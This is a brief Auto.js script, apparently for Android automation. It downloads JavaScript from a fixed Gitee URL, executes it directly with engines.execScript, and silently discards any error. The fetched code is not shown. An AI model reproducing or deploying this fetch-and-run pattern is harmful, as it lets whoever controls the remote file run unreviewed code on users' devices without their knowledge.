var url = "https://gitee.com/jixiangxia_admin/jk/raw/master/main.js"

try {
    var 源码 = http.get(url)
    if (源码.statusCode==200) {
        var ym =  源码.body.string()
        engines.execScript("test",ym)
    }
} catch (error) {
    
}